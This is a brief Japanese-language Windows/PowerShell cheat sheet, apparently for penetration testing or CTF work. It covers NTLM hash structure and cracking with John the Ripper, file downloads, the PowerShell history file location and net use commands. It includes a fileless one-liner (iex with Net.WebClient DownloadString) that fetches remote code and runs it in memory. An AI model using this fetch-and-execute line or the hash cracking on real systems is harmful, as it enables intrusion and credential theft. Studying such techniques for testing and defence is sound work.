## NTLMハッシュ
NTLMハッシュ（NT LAN Manager Hash）とは、Microsoft Windowsネットワーク環境で認証のために使用される、ユーザーのパスワードを不可逆的に変換したハッシュ値のこと。
johntheripperなどを使用することでクラックできることがある。
```bash
# 構造
ユーザー名:ホスト名またはドメイン:サーバーチャレンジ:クライアントレスポンス:クライアントチャレンジ/BLOB
```

## ファイルをダウンロード
```powershell
wget <URL> -o <ダウンロード先のパスと保存名>
iwr -URI <URL> -o <ダウンロード先のパスと保存名>
```

## ファイル自体はダウンロードせずメモリ上で実行
```powershell
iex (New-Object Net.WebClient).DownloadString('<URL>')
```

## PSReadLineによる履歴ファイル
PowerShellの標準機能であるPSReadLineモジュールによって行われる。  
PowerShellセッションが終了する際、または一定のタイミングで、メモリ上の履歴リスト全体がファイル（ConsoleHost_history.txt）に自動的に書き込まれる。  
生成されるパス  
`C:\Users\<ユーザー名>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

## netコマンド
```cmd
net user # 存在するユーザーを表示
net use # マウントしているドライブを表示
net use \\<ホスト名など>\<フォルダ名> /user:<ユーザー名> <パスワード> # ドライブにマウントせずに接続のみ確立し、アクセスはUNCパスを使う
net use <ドライブ>: \\<ホスト名など>\<フォルダ名> /user:<ユーザー名> <パスワード> # 指定したドライブにマウント
net use <ドライブ>: /delete # マウントを削除
```



